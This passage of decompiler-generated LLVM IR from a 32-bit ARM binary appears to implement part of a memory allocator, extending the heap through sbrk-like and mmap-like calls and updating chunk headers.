  %v1_cd48 = load i32, i32* %r2.global-to-local, align 4
  %v0_cd4c = load i32, i32* %lr.global-to-local, align 4
  %v1_cd4c = add i32 %v0_cd4c, 8
  store i32 %v1_cd4c, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_cd44, %v1_cd48
  br i1 %tmp213, label %bb151, label %dec_label_pc_d060

bb151:                                            ; preds = %bb150
  %v5_cd50 = load i32, i32* %ip.global-to-local, align 4
  %v6_cd50 = add i32 %v5_cd50, 884
  %v7_cd50 = inttoptr i32 %v6_cd50 to i32*
  store i32 %v2_cd44, i32* %v7_cd50, align 4
  br label %dec_label_pc_d060

dec_label_pc_cd58:                                ; preds = %dec_label_pc_cc9c, %dec_label_pc_cc7c, %dec_label_pc_ccb0.dec_label_pc_cd58_crit_edge, %dec_label_pc_cc8c
  %v1_cd7c = phi i32 [ %v1_cd7c.pre, %dec_label_pc_ccb0.dec_label_pc_cd58_crit_edge ], [ %v0_cc24, %dec_label_pc_cc8c ], [ %v0_cc24, %dec_label_pc_cc7c ], [ %v0_cc24, %dec_label_pc_cc9c ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %ip.global-to-local, align 4
  %v4_cd60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_cd60, i32* %r3.global-to-local, align 4
  %v1_cd64 = add i32 %v4_cd60, 44
  %v2_cd64 = inttoptr i32 %v1_cd64 to i32*
  %v3_cd64 = load i32, i32* %v2_cd64, align 4
  store i32 %v3_cd64, i32* %r0.global-to-local, align 4
  %v1_cd68 = add i32 %v4_cd60, 864
  %v2_cd68 = inttoptr i32 %v1_cd68 to i32*
  %v3_cd68 = load i32, i32* %v2_cd68, align 4
  store i32 %v3_cd68, i32* %r2.global-to-local, align 4
  %v1_cd6c = add i32 %v4_cd60, 840
  %v2_cd6c = inttoptr i32 %v1_cd6c to i32*
  %v3_cd6c = load i32, i32* %v2_cd6c, align 4
  store i32 %v3_cd6c, i32* %r3.global-to-local, align 4
  %v1_cd70 = add i32 %v3_cd64, 4
  %v2_cd70 = inttoptr i32 %v1_cd70 to i32*
  %v3_cd70 = load i32, i32* %v2_cd70, align 4
  store i32 %v3_cd70, i32* %r1.global-to-local, align 4
  %v1_cd78 = urem i32 %v3_cd68, 2
  %v2_cd78 = icmp eq i32 %v1_cd78, 0
  %v1_cd74 = add i32 %v1_cd7c, 16
  %v2_cd7c = add i32 %v1_cd74, %v3_cd6c
  store i32 %v2_cd7c, i32* %r3.global-to-local, align 4
  %v1_cd80 = and i32 %v3_cd70, -4
  store i32 %v1_cd80, i32* @r8, align 4
  br i1 %v2_cd78, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_cd58
  %v3_cd84 = sub i32 %v2_cd7c, %v1_cd80
  store i32 %v3_cd84, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_cd58, %bb152
  %v0_cd88 = phi i32 [ %v2_cd7c, %dec_label_pc_cd58 ], [ %v3_cd84, %bb152 ]
  %v1_cd88 = load i32, i32* %sb.global-to-local, align 4
  %v2_cd88 = add i32 %v1_cd88, %v0_cd88
  store i32 %v2_cd88, i32* %r3.global-to-local, align 4
  %v1_cd8c = sub i32 -1, %v1_cd88
  store i32 %v1_cd8c, i32* %fp.global-to-local, align 4
  %v2_cd90 = and i32 %v2_cd88, %v1_cd8c
  store i32 %v2_cd90, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_cd90, 1
  br i1 %tmp154, label %dec_label_pc_cdb4, label %dec_label_pc_cda0

dec_label_pc_cda0:                                ; preds = %bb153
  store i32 %v2_cd90, i32* %r0.global-to-local, align 4
  %v1_cda4 = call i32 @function_f4a4(i32 %v2_cd90)
  store i32 %v1_cda4, i32* %r0.global-to-local, align 4
  %v3_cda8 = icmp eq i32 %v1_cda4, -1
  store i32 %v1_cda4, i32* @r4, align 4
  br i1 %v3_cda8, label %dec_label_pc_cdb4, label %dec_label_pc_ce20

dec_label_pc_cdb4:                                ; preds = %dec_label_pc_cda0, %bb153
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r1.global-to-local, align 4
  %v4_cdbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_cdbc, i32* %r6.global-to-local, align 4
  %v1_cdc0 = add i32 %v4_cdbc, 864
  %v2_cdc0 = inttoptr i32 %v1_cdc0 to i32*
  %v3_cdc0 = load i32, i32* %v2_cdc0, align 4
  store i32 %v3_cdc0, i32* %r3.global-to-local, align 4
  %v1_cdc4 = urem i32 %v3_cdc0, 2
  %v2_cdc4 = icmp eq i32 %v1_cdc4, 0
  br i1 %v2_cdc4, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_cdb4
  %v1_cdc8 = load i32, i32* @r8, align 4
  %v2_cdc8 = load i32, i32* %sb.global-to-local, align 4
  %v3_cdc8 = add i32 %v2_cdc8, %v1_cdc8
  %v2_cdcc = load i32, i32* @r5, align 4
  %v3_cdcc = add i32 %v3_cdc8, %v2_cdcc
  store i32 %v3_cdcc, i32* %r3.global-to-local, align 4
  %v2_cdd0 = load i32, i32* %fp.global-to-local, align 4
  %v3_cdd0 = and i32 %v2_cdd0, %v3_cdcc
  store i32 %v3_cdd0, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_cdb4
  %v0_cdd4.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_cdd4 = phi i32 [ %v0_cdd4.pr, %.thread29thread-pre-split ], [ %v3_cdd0, %bb155 ]
  %v2_cdd4 = icmp ugt i32 %v0_cdd4, 1048575
  br i1 %v2_cdd4, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_cdec = phi i32 [ %v0_cdd4, %.thread29 ], [ 1048576, %bb156 ]
  %v1_cddc = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_cdec, %v1_cddc
  br i1 %tmp214, label %dec_label_pc_cde4, label %dec_label_pc_d048

dec_label_pc_cde4:                                ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_cdec, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_ce00 = call i32 @function_effc(i32 0, i32 %v0_cdec, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_ce00, i32* %r0.global-to-local, align 4
  %v3_ce04 = icmp eq i32 %v6_ce00, -1
  %v8_ce04 = icmp eq i32 %v6_ce00, -1
  store i32 %v6_ce00, i32* @r4, align 4
  br i1 %v8_ce04, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_cde4
  %v1_ce0c = load i32, i32* %r6.global-to-local, align 4
  %v2_ce0c = add i32 %v1_ce0c, 864
  %v3_ce0c = inttoptr i32 %v2_ce0c to i32*
  %v4_ce0c = load i32, i32* %v3_ce0c, align 4
  %v2_ce10 = load i32, i32* @r5, align 4
  %v3_ce10 = add i32 %v2_ce10, %v6_ce00
  store i32 %v3_ce10, i32* %r0.global-to-local, align 4
  %v2_ce14 = and i32 %v4_ce0c, -2
  store i32 %v2_ce14, i32* %r3.global-to-local, align 4
  store i32 %v2_ce14, i32* %v3_ce0c, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_cde4, %bb158
  br i1 %v3_ce04, label %dec_label_pc_ce20, label %dec_label_pc_ce24

dec_label_pc_ce20:                                ; preds = %.thread32, %dec_label_pc_cda0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ce24

dec_label_pc_ce24:                                ; preds = %.thread32, %dec_label_pc_ce20
  %v0_ce24 = load i32, i32* @r4, align 4
  %v7_ce24 = icmp eq i32 %v0_ce24, -1
  br i1 %v7_ce24, label %dec_label_pc_d048, label %dec_label_pc_ce2c

dec_label_pc_ce2c:                                ; preds = %dec_label_pc_ce24
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r2.global-to-local, align 4
  %v4_ce34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_ce34, i32* %ip.global-to-local, align 4
  store i32 %v3_cd64, i32* %r2.global-to-local, align 4
  %v1_ce3c = add i32 %v4_ce34, 872
  %v2_ce3c = inttoptr i32 %v1_ce3c to i32*
  %v3_ce3c = load i32, i32* %v2_ce3c, align 4
  %v1_ce40 = load i32, i32* @r8, align 4
  %v2_ce40 = add i32 %v1_ce40, %v3_cd64
  store i32 %v2_ce40, i32* %r1.global-to-local, align 4
  %v0_ce44 = load i32, i32* @r5, align 4
  %v2_ce44 = add i32 %v0_ce44, %v3_ce3c
  store i32 %v2_ce44, i32* %r3.global-to-local, align 4
  %v9_ce48 = icmp eq i32 %v0_ce24, %v2_ce40
  br i1 %v9_ce48, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_ce2c
  store i32 %v2_ce44, i32* %v2_ce3c, align 4
  br label %dec_label_pc_ce64

bb159:                                            ; preds = %dec_label_pc_ce2c
  %v1_ce4c = load i32, i32* %r0.global-to-local, align 4
  %v8_ce4c = icmp eq i32 %v1_ce4c, -1
  store i32 %v2_ce44, i32* %v2_ce3c, align 4
  br i1 %v8_ce4c, label %.thread34, label %dec_label_pc_ce64

.thread34:                                        ; preds = %bb159
  %v1_ce54 = load i32, i32* @r5, align 4
  %v2_ce54 = load i32, i32* @r8, align 4
  %v3_ce54 = add i32 %v2_ce54, %v1_ce54
  %v2_ce58 = or i32 %v3_ce54, 1
  store i32 %v2_ce58, i32* %r3.global-to-local, align 4
  %v2_ce5c = load i32, i32* %r2.global-to-local, align 4
  %v3_ce5c = add i32 %v2_ce5c, 4
  %v4_ce5c = inttoptr i32 %v3_ce5c to i32*
  store i32 %v2_ce58, i32* %v4_ce5c, align 4
  br label %dec_label_pc_cfdc

dec_label_pc_ce64:                                ; preds = %bb159, %.thread122
  %v0_ce68.pr = load i32, i32* @r8, align 4
  %v0_ce64 = load i32, i32* %ip.global-to-local, align 4
  %v1_ce64 = add i32 %v0_ce64, 864
  %v2_ce64 = inttoptr i32 %v1_ce64 to i32*
  %v3_ce64 = load i32, i32* %v2_ce64, align 4
  store i32 %v3_ce64, i32* %r2.global-to-local, align 4
  %v2_ce68 = icmp eq i32 %v0_ce68.pr, 0
  br i1 %v2_ce68, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_ce64
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_ce64
  %v2_ce70 = urem i32 %v3_ce64, 2
  store i32 %v2_ce70, i32* %r3.global-to-local, align 4
  %v2_ce74 = icmp eq i32 %v2_ce70, 0
  br i1 %v2_ce74, label %.thread40, label %dec_label_pc_ce7c

dec_label_pc_ce7c:                                ; preds = %.thread36
  %v0_ce7c = load i32, i32* @r4, align 4
  %v1_ce7c = load i32, i32* %r1.global-to-local, align 4
  %v3_ce7c = icmp ult i32 %v0_ce7c, %v1_ce7c
  br i1 %v3_ce7c, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_ce7c
  %v2_ce80 = and i32 %v3_ce64, -2
  store i32 %v2_ce80, i32* %r3.global-to-local, align 4
  store i32 %v2_ce80, i32* %v2_ce64, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_ce7c, %.thread37, %.thread36, %bb160
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %ip.global-to-local, align 4
  %v4_ce90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_ce90, i32* @r7, align 4
  %v1_ce94 = add i32 %v4_ce90, 864
  %v2_ce94 = inttoptr i32 %v1_ce94 to i32*
  %v3_ce94 = load i32, i32* %v2_ce94, align 4
  store i32 %v3_ce94, i32* %r3.global-to-local, align 4
  %v1_ce98 = urem i32 %v3_ce94, 2
  store i32 %v1_ce98, i32* @r6, align 4
  %v2_ce98 = icmp eq i32 %v1_ce98, 0
  br i1 %v2_ce98, label %dec_label_pc_cf2c, label %dec_label_pc_cea0

dec_label_pc_cea0:                                ; preds = %.thread40
  %v0_cea0 = load i32, i32* @r8, align 4
  %v2_cea0 = icmp eq i32 %v0_cea0, 0
  br i1 %v2_cea0, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_cea0
  %v2_cea4 = add i32 %v4_ce90, 872
  %v3_cea4 = inttoptr i32 %v2_cea4 to i32*
  %v4_cea4 = load i32, i32* %v3_cea4, align 4
  store i32 %v4_cea4, i32* %r2.global-to-local, align 4
  %v1_cea8 = load i32, i32* %r1.global-to-local, align 4
  %v2_cea8 = load i32, i32* @r4, align 4
  %v3_cea8 = sub i32 %v2_cea8, %v1_cea8
  %v3_ceac = add i32 %v3_cea8, %v4_cea4
  store i32 %v3_ceac, i32* %r3.global-to-local, align 4
  store i32 %v3_ceac, i32* %v3_cea4, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_cea0, %bb161
  %v0_ceb4 = load i32, i32* @r4, align 4
  %v1_ceb4 = urem i32 %v0_ceb4, 8
  store i32 %v1_ceb4, i32* %r3.global-to-local, align 4
  %v2_ceb4 = icmp eq i32 %v1_ceb4, 0
  br i1 %v2_ceb4, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_ceb8 = sub nsw i32 8, %v1_ceb4
  store i32 %v2_ceb8, i32* %r3.global-to-local, align 4
  %v3_cebc = add i32 %v2_ceb8, %v0_ceb4
  store i32 %v3_cebc, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_cec4 = phi i32 [ 0, %.thread43 ], [ %v2_ceb8, %bb162 ]
  %v1_cec0 = load i32, i32* @r5, align 4
  %v2_cec0 = add i32 %v1_cec0, %v0_ceb4
  store i32 %v2_cec0, i32* @r6, align 4
  %v1_cec4 = load i32, i32* @r8, align 4
  %v2_cec4 = add i32 %v2_cec0, %v0_cec4
  %v2_cec8 = add i32 %v2_cec4, %v1_cec4
  store i32 %v2_cec8, i32* %r1.global-to-local, align 4
  %v1_cecc = load i32, i32* %sb.global-to-local, align 4
  %v2_cecc = add i32 %v1_cecc, %v2_cec8
  %v1_ced0 = load i32, i32* %fp.global-to-local, align 4
  %v2_ced0 = and i32 %v1_ced0, %v2_cecc
  store i32 %v2_ced0, i32* %r2.global-to-local, align 4
  %v2_ced4 = sub i32 0, %v2_cec0
  store i32 %v2_ced4, i32* %r3.global-to-local, align 4
  %v2_ced8 = sub i32 %v2_ced0, %v2_cec0
  store i32 %v2_ced8, i32* @r5, align 4
  store i32 %v2_ced8, i32* %r0.global-to-local, align 4
  br i1 %v2_ceb4, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_ceb4, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_cee4 = call i32 @function_f4a4(i32 %v2_ced8)
  store i32 %v1_cee4, i32* %r0.global-to-local, align 4
  %v3_cee8 = icmp eq i32 %v1_cee4, -1
  br i1 %v3_cee8, label %dec_label_pc_cef0, label %dec_label_pc_cf00

dec_label_pc_cef0:                                ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_cef4 = call i32 @function_f4a4(i32 0)
  store i32 %v1_cef4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_cf58

dec_label_pc_cf00:                                ; preds = %bb164
  %v1_cf00 = load i32, i32* @r4, align 4
  %v3_cf00 = icmp ult i32 %v1_cee4, %v1_cf00
  br i1 %v3_cf00, label %dec_label_pc_cf08, label %dec_label_pc_cf58

dec_label_pc_cf08:                                ; preds = %dec_label_pc_cf00
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r0.global-to-local, align 4
  %v4_cf10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_cf10, i32* %r2.global-to-local, align 4
  %v1_cf14 = add i32 %v4_cf10, 864
  %v2_cf14 = inttoptr i32 %v1_cf14 to i32*
  %v3_cf14 = load i32, i32* %v2_cf14, align 4
  %v0_cf18 = load i32, i32* @r6, align 4
  store i32 %v0_cf18, i32* %r0.global-to-local, align 4
  %v1_cf1c = and i32 %v3_cf14, -2
  store i32 %v1_cf1c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_cf1c, i32* %v2_cf14, align 4
  br label %dec_label_pc_cf58

dec_label_pc_cf2c:                                ; preds = %.thread40
  %v0_cf2c = load i32, i32* %r0.global-to-local, align 4
  %v3_cf2c = icmp eq i32 %v0_cf2c, -1
  br i1 %v3_cf2c, label %dec_label_pc_cf34, label %dec_label_pc_cf50

dec_label_pc_cf34:                                ; preds = %dec_label_pc_cf2c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_cf38 = call i32 @function_f4a4(i32 0)
  store i32 %v1_cf38, i32* %r0.global-to-local, align 4
  %v0_cf3c = load i32, i32* @r7, align 4
  %v1_cf3c = add i32 %v0_cf3c, 872
  %v2_cf3c = inttoptr i32 %v1_cf3c to i32*
  %v3_cf3c = load i32, i32* %v2_cf3c, align 4
  store i32 %v3_cf3c, i32* %r2.global-to-local, align 4
  %v0_cf40 = load i32, i32* @r4, align 4
  %v0_cf44 = load i32, i32* @r5, align 4
  %v2_cf40 = add i32 %v3_cf3c, %v1_cf38
  %v2_cf44 = sub i32 %v2_cf40, %v0_cf40
  %v2_cf48 = sub i32 %v2_cf44, %v0_cf44
  store i32 %v2_cf48, i32* %r3.global-to-local, align 4
  store i32 %v2_cf48, i32* %v2_cf3c, align 4
  %v0_cf54.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_cf50

dec_label_pc_cf50:                                ; preds = %dec_label_pc_cf2c, %dec_label_pc_cf34
  %v0_cf54 = phi i32 [ 0, %dec_label_pc_cf2c ], [ %v0_cf54.pre, %dec_label_pc_cf34 ]
  %v0_cf50 = load i32, i32* @r4, align 4
  store i32 %v0_cf50, i32* @r7, align 4
  store i32 %v0_cf54, i32* @r5, align 4
  br label %dec_label_pc_cf58

dec_label_pc_cf58:                                ; preds = %dec_label_pc_cf00, %dec_label_pc_cf08, %dec_label_pc_cef0, %dec_label_pc_cf50
  %v0_cf58 = load i32, i32* %r0.global-to-local, align 4
  %v7_cf58 = icmp eq i32 %v0_cf58, -1
  br i1 %v7_cf58, label %dec_label_pc_cfdc, label %dec_label_pc_cf60

dec_label_pc_cf60:                                ; preds = %dec_label_pc_cf58
  %v1_cf60 = load i32, i32* @r5, align 4
  %v2_cf60 = add i32 %v1_cf60, %v0_cf58
  %v0_cf64 = load i32, i32* @r7, align 4
  %v2_cf64 = sub i32 %v2_cf60, %v0_cf64
  %v1_cf68 = or i32 %v2_cf64, 1
  %v2_cf6c = add i32 %v0_cf64, 4
  %v3_cf6c = inttoptr i32 %v2_cf6c to i32*
  store i32 %v1_cf68, i32* %v3_cf6c, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_cf78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_cf78, i32* @r6, align 4
  %v1_cf7c = add i32 %v4_cf78, 872
  %v2_cf7c = inttoptr i32 %v1_cf7c to i32*
  %v3_cf7c = load i32, i32* %v2_cf7c, align 4
  %v0_cf80 = load i32, i32* @r8, align 4
  %v2_cf80 = icmp eq i32 %v0_cf80, 0
  %v0_cf84 = load i32, i32* @r5, align 4
  %v2_cf84 = add i32 %v0_cf84, %v3_cf7c
  store i32 %v2_cf84, i32* %r3.global-to-local, align 4
  store i32 %v2_cf84, i32* %v2_cf7c, align 4
  %v0_cf8c = load i32, i32* @r7, align 4
  %v1_cf8c = load i32, i32* @r6, align 4
  %v2_cf8c = add i32 %v1_cf8c, 44
  %v3_cf8c = inttoptr i32 %v2_cf8c to i32*
  store i32 %v0_cf8c, i32* %v3_cf8c, align 4
  br i1 %v2_cf80, label %dec_label_pc_cfdc, label %dec_label_pc_cf94

dec_label_pc_cf94:                                ; preds = %dec_label_pc_cf60
  %v0_cf98 = load i32, i32* @r8, align 4
  %v1_cf98 = add i32 %v0_cf98, -12
  %v1_cf9c = and i32 %v1_cf98, -8
  store i32 %v3_cd64, i32* %ip.global-to-local, align 4
  %v2_cfa4 = add i32 %v1_cf9c, %v3_cd64
  store i32 %v2_cfa4, i32* %r1.global-to-local, align 4
  %v2_cfa8 = icmp ugt i32 %v1_cf9c, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_cfb0 = or i32 %v1_cf9c, 1
  store i32 %v1_cfb0, i32* %r3.global-to-local, align 4
  store i32 %v1_cfb0, i32* %v2_cd70, align 4
  %v0_cfb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_cfb8 = load i32, i32* %r1.global-to-local, align 4
  %v2_cfb8 = add i32 %v1_cfb8, 8
  %v3_cfb8 = inttoptr i32 %v2_cfb8 to i32*
  store i32 %v0_cfb8, i32* %v3_cfb8, align 4
  %v0_cfbc = load i32, i32* %r2.global-to-local, align 4
  %v1_cfbc = load i32, i32* %r1.global-to-local, align 4
  %v2_cfbc = add i32 %v1_cfbc, 4
  %v3_cfbc = inttoptr i32 %v2_cfbc to i32*
  store i32 %v0_cfbc, i32* %v3_cfbc, align 4
  br i1 %v2_cfa8, label %dec_label_pc_cfc4, label %dec_label_pc_cfdc

dec_label_pc_cfc4:                                ; preds = %dec_label_pc_cf94
  %v0_cfc4 = load i32, i32* @r6, align 4
  %v1_cfc4 = add i32 %v0_cfc4, 836
  %v2_cfc4 = inttoptr i32 %v1_cfc4 to i32*
  %v3_cfc4 = load i32, i32* %v2_cfc4, align 4
  store i32 %v3_cfc4, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_cfcc = load i32, i32* %ip.global-to-local, align 4
  %v1_cfcc = add i32 %v0_cfcc, 8
  store i32 %v1_cfcc, i32* @r0, align 4
  store i32 -1, i32* %v2_cfc4, align 4
  %v0_cfd4 = call i32 @function_d458()
  store i32 %v0_cfd4, i32* %r0.global-to-local, align 4
  %v0_cfd8 = load i32, i32* @r4, align 4
  %v1_cfd8 = load i32, i32* @r6, align 4
  %v2_cfd8 = add i32 %v1_cfd8, 836
  %v3_cfd8 = inttoptr i32 %v2_cfd8 to i32*
  store i32 %v0_cfd8, i32* %v3_cfd8, align 4
  br label %dec_label_pc_cfdc

dec_label_pc_cfdc:                                ; preds = %.thread34, %dec_label_pc_cf94, %dec_label_pc_cf60, %dec_label_pc_cf58, %dec_label_pc_cfc4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r0.global-to-local, align 4
  %v4_cfe4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_cfe4, i32* %lr.global-to-local, align 4
  %v1_cfe8 = add i32 %v4_cfe4, 872
  store i32 %v1_cfe8, i32* %r1.global-to-local, align 4
  %v1_cfec = inttoptr i32 %v1_cfe8 to i32*
  %v2_cfec = load i32, i32* %v1_cfec, align 4
  store i32 %v2_cfec, i32* %r1.global-to-local, align 4
  %v3_cfec = add i32 %v4_cfe4, 876
  %v4_cfec = inttoptr i32 %v3_cfec to i32*
  %v5_cfec = load i32, i32* %v4_cfec, align 4
  store i32 %v5_cfec, i32* %r3.global-to-local, align 4
  %v1_cff4 = add i32 %v4_cfe4, 868
  %v2_cff4 = inttoptr i32 %v1_cff4 to i32*
  %v3_cff4 = load i32, i32* %v2_cff4, align 4
  store i32 %v3_cff4, i32* %r3.global-to-local, align 4
  %v1_cff8 = add i32 %v4_cfe4, 884
  %v2_cff8 = inttoptr i32 %v1_cff8 to i32*
  %v3_cff8 = load i32, i32* %v2_cff8, align 4
  store i32 %v3_cff8, i32* %r2.global-to-local, align 4
  %v2_cffc = add i32 %v3_cff4, %v2_cfec
  store i32 %v2_cffc, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_cfec, %v5_cfec
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_cfdc
  store i32 %v2_cfec, i32* %v4_cfec, align 4
  %v0_d004.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_d004.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_cfdc, %bb165
  %v1_d004 = phi i32 [ %v3_cff8, %dec_label_pc_cfdc ], [ %v1_d004.pre, %bb165 ]
  %v4_d008 = phi i32 [ %v2_cffc, %dec_label_pc_cfdc ], [ %v0_d004.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_d008, %v1_d004
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_d008 = load i32, i32* %lr.global-to-local, align 4
  %v6_d008 = add i32 %v5_d008, 884
  %v7_d008 = inttoptr i32 %v6_d008 to i32*
  store i32 %v4_d008, i32* %v7_d008, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_d00c = load i32, i32* %lr.global-to-local, align 4
  %v1_d00c = add i32 %v0_d00c, 44
  %v2_d00c = inttoptr i32 %v1_d00c to i32*
  %v3_d00c = load i32, i32* %v2_d00c, align 4
  store i32 %v3_d00c, i32* %ip.global-to-local, align 4
  %v1_d010 = add i32 %v3_d00c, 4
  %v2_d010 = inttoptr i32 %v1_d010 to i32*
  %v3_d010 = load i32, i32* %v2_d010, align 4
  store i32 %v1_cc24, i32* %r1.global-to-local, align 4
  %v1_d018 = and i32 %v3_d010, -4
  store i32 %v1_d018, i32* %r3.global-to-local, align 4
  %v3_d01c = icmp ult i32 %v1_d018, %v1_cc24
  br i1 %v3_d01c, label %dec_label_pc_d048, label %dec_label_pc_d024

dec_label_pc_d024:                                ; preds = %bb168
  %v0_d024 = load i32, i32* @sl, align 4
  %v2_d024 = sub i32 %v1_d018, %v0_d024
  %v2_d028 = add i32 %v0_d024, %v3_d00c
  store i32 %v2_d028, i32* %r1.global-to-local, align 4
  %v1_d02c = or i32 %v2_d024, 1
  store i32 %v1_d02c, i32* %r3.global-to-local, align 4
  %v1_d030 = or i32 %v0_d024, 1
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v1_d034 = add i32 %v3_d00c, 8
  store i32 %v1_d034, i32* %r0.global-to-local, align 4
  store i32 %v1_d030, i32* %v2_d010, align 4
  %v0_d03c = load i32, i32* %r1.global-to-local, align 4
  %v1_d03c = load i32, i32* %lr.global-to-local, align 4
  %v2_d03c = add i32 %v1_d03c, 44
  %v3_d03c = inttoptr i32 %v2_d03c to i32*
  store i32 %v0_d03c, i32* %v3_d03c, align 4
  %v0_d040 = load i32, i32* %r3.global-to-local, align 4
  %v1_d040 = load i32, i32* %r1.global-to-local, align 4
  %v2_d040 = add i32 %v1_d040, 4
  %v3_d040 = inttoptr i32 %v2_d040 to i32*
  store i32 %v0_d040, i32* %v3_d040, align 4
  br label %dec_label_pc_d060

dec_label_pc_d048:                                ; preds = %bb157, %bb168, %dec_label_pc_ce24
  store i32 66176, i32* %r3.global-to-local, align 4
  %v0_d04c = call i32 @function_f150()
  %v3_d050 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_d050 = sext i16 %v3_d050 to i32
  store i32 %v4_d050, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_d058 = add i32 %v4_d050, %v0_d04c
  %v4_d058 = inttoptr i32 %v3_d058 to i32*
  store i32 12, i32* %v4_d058, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d060

dec_label_pc_d060:                                ; preds = %bb151, %bb150, %dec_label_pc_cc6c, %dec_label_pc_d024, %dec_label_pc_d048
  %v0_d060 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d060, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d064

dec_label_pc_d064:                                ; preds = %.thread1, %dec_label_pc_cc38, %.thread121, %dec_label_pc_caa8, %dec_label_pc_ca9c, %dec_label_pc_c904, %dec_label_pc_c888, %dec_label_pc_d060
  store i32 %v2_c7a8, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r2.global-to-local, align 4
  %v4_d074 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 44) to i32*), align 4
  store i32 %v4_d074, i32* %ip.global-to-local, align 4
  store i32 53376, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d074)
  br label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_d064
  %v0_d080 = load i32, i32* %r4.global-to-local, align 4
